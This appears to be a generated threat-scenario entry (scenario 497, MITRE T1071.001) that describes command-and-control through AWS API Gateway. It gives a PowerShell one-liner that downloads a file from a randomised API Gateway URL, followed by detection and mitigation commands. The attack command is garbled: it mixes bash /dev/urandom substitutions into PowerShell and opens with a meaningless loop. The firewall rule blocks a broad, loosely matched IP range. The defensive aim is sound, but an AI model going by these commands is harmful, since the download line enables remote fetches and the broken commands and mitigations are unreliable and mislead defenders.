---
type: campaign
scenario_id: 497
tactic: Command and Control
technique: "T1071.001: Application Layer Protocol: Web Protocols"
technique_id: T1071.001
tags: [campaign, lotl, command_and_control]
---

# Using Invoke-WebRequest for C2 via AWS API Gateway.

## Threat Description
Using Invoke-WebRequest for C2 via AWS API Gateway.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Invoke-WebRequest -Uri https://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).execute-api.us-east-1.amazonaws.com/prod/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -OutFile C:\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt"
```

## Detection Logic
Monitor Invoke-WebRequest AWS: `wmic process where name='powershell.exe' get commandline | findstr execute-api`; Network traffic: `tshark -Y 'http.host contains execute-api.us-east-1.amazonaws.com'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block AWS API Gateway: `netsh advfirewall firewall add rule name='Block API Gateway' dir=out action=block remoteip=52.94.0.0/16`.

## AI Training Prompt
Train AI to detect Invoke-WebRequest C2 via AWS API Gateway by analyzing HTTP requests, API Gateway URLs, and file creation patterns; recommend API blocking.

## References
- MITRE ATT&CK T1071.001: https://attack.mitre.org/techniques/T1071/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
